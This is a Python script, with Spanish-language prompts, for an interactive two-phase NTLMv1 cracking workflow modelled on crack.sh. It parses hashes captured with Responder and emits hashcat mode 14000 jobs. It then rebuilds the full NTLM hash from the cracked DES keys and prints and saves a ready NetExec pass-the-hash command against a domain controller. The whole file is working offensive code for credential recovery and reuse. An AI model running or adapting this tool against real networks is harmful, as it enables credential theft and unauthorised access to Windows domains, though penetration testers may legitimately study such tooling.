#!/usr/bin/env python3
"""
NTLMv1 Cracking Tool - Interactive 2-Phase Workflow
Based on crack.sh methodology
"""

import sys
import os
import json
from pathlib import Path


class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


# Import functions from the original ntlmv1.py script
# Add script directory to path
script_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, script_dir)

try:
    from ntlmv1 import (
        parse_ntlmv1,
        des_to_ntlm_slice,
        des_encrypt_block,
        recover_key_from_ct3
    )
except ImportError:
    print(f"\n{Colors.FAIL}[!] Error: No se encuentra el archivo ntlmv1.py{Colors.ENDC}")
    print(f"Asegúrate de que ntlmv1.py esté en el mismo directorio que este script:")
    print(f"  {script_dir}")
    sys.exit(1)


def print_banner():
    banner = f"""
{Colors.OKCYAN}╔═══════════════════════════════════════════════════════════╗
║           NTLMv1 Cracking Tool - 2 Phase Workflow        ║
║                   crack.sh methodology                     ║
╚═══════════════════════════════════════════════════════════╝{Colors.ENDC}
"""
    print(banner)


def print_phase_header(phase_num, title):
    print(f"\n{Colors.HEADER}{'='*60}")
    print(f"  PHASE {phase_num}: {title}")
    print(f"{'='*60}{Colors.ENDC}\n")


def phase1_extract_hashes():
    """
    Phase 1: Extract hashes for cracking
    Takes NTLMv1 hash and outputs format ready for hashcat/crack.sh
    """
    print_phase_header(1, "EXTRACT HASHES FOR CRACKING")
    
    print(f"{Colors.OKBLUE}Ingresa el hash NTLMv1 completo (formato Responder):{Colors.ENDC}")
    print(f"{Colors.WARNING}Formato: user::domain:lmresp:ntresp:challenge{Colors.ENDC}\n")
    
    ntlmv1_hash = input("Hash NTLMv1: ").strip()
    
    if not ntlmv1_hash:
        print(f"{Colors.FAIL}[!] Hash vacío{Colors.ENDC}")
        return
    
    try:
        # Parse the hash
        parsed = parse_ntlmv1(ntlmv1_hash, json_mode=True)
        
        # Save to file for later use
        state_file = Path("ntlmv1_state.json")
        with open(state_file, 'w') as f:
            json.dump(parsed, f, indent=2)
        
        print(f"\n{Colors.OKGREEN}[+] Hash parseado exitosamente{Colors.ENDC}")
        print(f"\n{Colors.BOLD}Información del hash:{Colors.ENDC}")
        print(f"  Usuario      : {parsed.get('username', 'N/A')}")
        print(f"  Dominio      : {parsed.get('domain', 'N/A')}")
        print(f"  Challenge    : {parsed['challenge']}")
        print(f"  CT1          : {parsed['ct1']}")
        print(f"  CT2          : {parsed['ct2']}")
        print(f"  CT3          : {parsed['ct3']}")
        
        # Check for ESS
        if parsed.get('lmresp') and parsed['lmresp'][20:] == "0000000000000000000000000000":
            print(f"\n{Colors.WARNING}[!] ESS/SSP detectado{Colors.ENDC}")
        
        # Generate hashcat format
        print(f"\n{Colors.OKCYAN}{'─'*60}{Colors.ENDC}")
        print(f"{Colors.BOLD}HASHES PARA CRACKEAR (formato hashcat -m 14000):{Colors.ENDC}\n")
        
        hash1 = f"{parsed['ct1']}:{parsed['challenge']}"
        hash2 = f"{parsed['ct2']}:{parsed['challenge']}"
        
        print(f"{Colors.OKGREEN}Hash 1: {hash1}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}Hash 2: {hash2}{Colors.ENDC}")
        
        # Save to file
        hashfile = Path("ntlmv1_hashes.txt")
        with open(hashfile, 'w') as f:
            f.write(f"{hash1}\n{hash2}\n")
        
        print(f"\n{Colors.OKBLUE}[i] Hashes guardados en: {hashfile}{Colors.ENDC}")
        
        # Cracking instructions
        print(f"\n{Colors.OKCYAN}{'─'*60}{Colors.ENDC}")
        print(f"{Colors.BOLD}CRACKEAR CON HASHCAT:{Colors.ENDC}\n")
        
        print(f"{Colors.OKGREEN}hashcat -m 14000 {hashfile} wordlist.txt -r rules/best64.rule{Colors.ENDC}")
        
        print(f"\n{Colors.OKCYAN}{'─'*60}{Colors.ENDC}")
        print(f"\n{Colors.BOLD}✓ Una vez que tengas las claves DES crackeadas, ejecuta PHASE 2{Colors.ENDC}\n")
        
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error parseando hash: {e}{Colors.ENDC}")
        import traceback
        traceback.print_exc()


def phase2_recover_ntlm():
    """
    Phase 2: Recover full NTLM hash from cracked DES keys
    """
    print_phase_header(2, "RECOVER NTLM HASH")
    
    # Check if state file exists
    state_file = Path("ntlmv1_state.json")
    if not state_file.exists():
        print(f"{Colors.FAIL}[!] No se encontró el archivo de estado de Phase 1{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Ejecuta primero Phase 1 o proporciona el hash NTLMv1 nuevamente{Colors.ENDC}\n")
        
        ntlmv1_hash = input("Hash NTLMv1 (o Enter para salir): ").strip()
        if not ntlmv1_hash:
            return
        
        try:
            parsed = parse_ntlmv1(ntlmv1_hash, json_mode=True)
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error parseando hash: {e}{Colors.ENDC}")
            return
    else:
        # Load state from Phase 1
        with open(state_file, 'r') as f:
            parsed = json.load(f)
        print(f"{Colors.OKGREEN}[+] Estado cargado de Phase 1{Colors.ENDC}")
    
    # Display challenge info
    print(f"\n{Colors.BOLD}Información del hash:{Colors.ENDC}")
    print(f"  Usuario      : {parsed.get('username', 'N/A')}")
    print(f"  Dominio      : {parsed.get('domain', 'N/A')}")
    print(f"  Challenge    : {parsed['challenge']}")
    
    # Show hashes that need to be cracked
    print(f"\n{Colors.OKCYAN}{'─'*60}{Colors.ENDC}")
    print(f"{Colors.BOLD}HASHES QUE DEBES HABER CRACKEADO:{Colors.ENDC}\n")
    print(f"{Colors.OKGREEN}Hash 1: {parsed['ct1']}:{parsed['challenge']}{Colors.ENDC}")
    print(f"{Colors.OKGREEN}Hash 2: {parsed['ct2']}:{parsed['challenge']}{Colors.ENDC}")
    
    print(f"\n{Colors.OKCYAN}{'─'*60}{Colors.ENDC}")
    print(f"{Colors.OKBLUE}Ingresa las claves DES crackeadas (en el mismo orden):{Colors.ENDC}\n")
    
    # Get DES keys
    key1 = input(f"Clave para Hash 1 (16 hex chars): ").strip()
    key2 = input(f"Clave para Hash 2 (16 hex chars): ").strip()
    
    if len(key1) != 16 or len(key2) != 16:
        print(f"{Colors.FAIL}[!] Las claves deben tener 16 caracteres hex (8 bytes){Colors.ENDC}")
        return
    
    try:
        # Verify keys and extract NTLM parts
        print(f"\n{Colors.OKBLUE}[*] Verificando claves...{Colors.ENDC}")
        
        # Verify key1
        encrypted1 = des_encrypt_block(key1, parsed['challenge'])
        if encrypted1 and encrypted1.lower() == parsed['ct1'].lower():
            pt1 = des_to_ntlm_slice(key1)
            print(f"{Colors.OKGREEN}[+] Key1 válida - PT1: {pt1}{Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}[!] Key1 inválida - no coincide con CT1{Colors.ENDC}")
            return
        
        # Verify key2
        encrypted2 = des_encrypt_block(key2, parsed['challenge'])
        if encrypted2 and encrypted2.lower() == parsed['ct2'].lower():
            pt2 = des_to_ntlm_slice(key2)
            print(f"{Colors.OKGREEN}[+] Key2 válida - PT2: {pt2}{Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}[!] Key2 inválida - no coincide con CT2{Colors.ENDC}")
            return
        
        # Recover PT3 (last 2 bytes) via brute force
        print(f"\n{Colors.OKBLUE}[*] Recuperando últimos 2 bytes (PT3) por fuerza bruta...{Colors.ENDC}")
        
        # Use the correct challenge (considering ESS if present)
        challenge_for_pt3 = parsed.get('client_challenge', parsed['challenge'])
        lmresp = parsed.get('lmresp')
        
        pt3 = recover_key_from_ct3(parsed['ct3'], challenge_for_pt3, lmresp)
        
        if pt3:
            print(f"{Colors.OKGREEN}[+] PT3 recuperado: {pt3}{Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}[!] No se pudo recuperar PT3{Colors.ENDC}")
            return
        
        # Construct full NTLM hash
        ntlm_hash = pt1 + pt2 + pt3
        
        print(f"\n{Colors.OKCYAN}{'='*60}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.OKGREEN}[+] NTLM HASH RECUPERADO:{Colors.ENDC}")
        print(f"\n{Colors.BOLD}{Colors.OKGREEN}{ntlm_hash.upper()}{Colors.ENDC}\n")
        print(f"{Colors.OKCYAN}{'='*60}{Colors.ENDC}")
        
        # Save result
        result_file = Path("ntlm_recovered.txt")
        username = parsed.get('username', 'N/A')
        domain = parsed.get('domain', 'N/A')
        
        with open(result_file, 'w') as f:
            f.write(f"Username: {username}\n")
            f.write(f"Domain: {domain}\n")
            f.write(f"NTLM Hash: {ntlm_hash.upper()}\n")
            f.write(f"\n")
            f.write(f"PT1: {pt1}\n")
            f.write(f"PT2: {pt2}\n")
            f.write(f"PT3: {pt3}\n")
            f.write(f"\n")
            f.write(f"DES Key1: {key1}\n")
            f.write(f"DES Key2: {key2}\n")
            f.write(f"Challenge: {parsed['challenge']}\n")
            f.write(f"\n")
            # Add nxc command ready to use
            nxc_user = username if username.endswith('$') else username + '$'
            f.write(f"# NetExec command:\n")
            f.write(f"nxc smb DCIP -u '{nxc_user}' -H '{ntlm_hash.upper()}'\n")
        
        print(f"\n{Colors.OKBLUE}[i] Resultado guardado en: {result_file}{Colors.ENDC}")
        
        # Get username for nxc command
        username = parsed.get('username', 'USERNAME')
        if not username.endswith('$'):
            username = username + '$'
        
        print(f"\n{Colors.BOLD}Próximo paso - Usar con NetExec:{Colors.ENDC}")
        print(f"  {Colors.OKGREEN}nxc smb DCIP -u '{username}' -H '{ntlm_hash.upper()}'{Colors.ENDC}\n")
        
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error recuperando NTLM: {e}{Colors.ENDC}")
        import traceback
        traceback.print_exc()


def show_help():
    """Display help information"""
    help_text = f"""
{Colors.BOLD}NTLMv1 Cracking Workflow:{Colors.ENDC}

{Colors.OKGREEN}Phase 1: Extract Hashes{Colors.ENDC}
  - Toma un hash NTLMv1 completo (formato Responder)
  - Extrae CT1 y CT2 para crackear
  - Genera formato hashcat (-m 14000)
  - Guarda estado para Phase 2

{Colors.OKGREEN}Phase 2: Recover NTLM{Colors.ENDC}
  - Usa las claves DES crackeadas (de crack.sh o hashcat)
  - Recupera los primeros 14 bytes del hash NTLM
  - Brute-force de los últimos 2 bytes (PT3)
  - Combina todo para obtener el hash NTLM completo

{Colors.BOLD}Formato de Hash NTLMv1:{Colors.ENDC}
  user::domain:lmresp:ntresp:challenge

{Colors.BOLD}Ejemplo:{Colors.ENDC}
  admin::WORKGROUP:1122334455667788:C3F5...48DF:1122334455667788

{Colors.BOLD}Recursos:{Colors.ENDC}
  - crack.sh: https://crack.sh/get-cracking/
  - Guía: https://crack.sh/cracking-ntlmv1-w-ess-ssp/
  - Hashcat mode 14000 (DES)
  - Hashcat mode 1000 (NTLM final)
"""
    print(help_text)


def main():
    print_banner()
    
    print(f"\n{Colors.OKCYAN}{'─'*60}{Colors.ENDC}")
    print(f"{Colors.BOLD}Selecciona una opción:{Colors.ENDC}\n")
    print(f"  {Colors.OKGREEN}1{Colors.ENDC} - Phase 1: Extraer hashes para crackear")
    print(f"  {Colors.OKGREEN}2{Colors.ENDC} - Phase 2: Recuperar hash NTLM completo")
    print(f"  {Colors.OKBLUE}h{Colors.ENDC} - Ayuda")
    print(f"{Colors.OKCYAN}{'─'*60}{Colors.ENDC}")
    
    choice = input(f"\n{Colors.BOLD}Opción: {Colors.ENDC}").strip().lower()
    
    if choice == '1':
        phase1_extract_hashes()
    elif choice == '2':
        phase2_recover_ntlm()
    elif choice == 'h':
        show_help()
    else:
        print(f"{Colors.FAIL}[!] Opción inválida{Colors.ENDC}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARNING}[!] Interrumpido por el usuario{Colors.ENDC}")
        sys.exit(0)
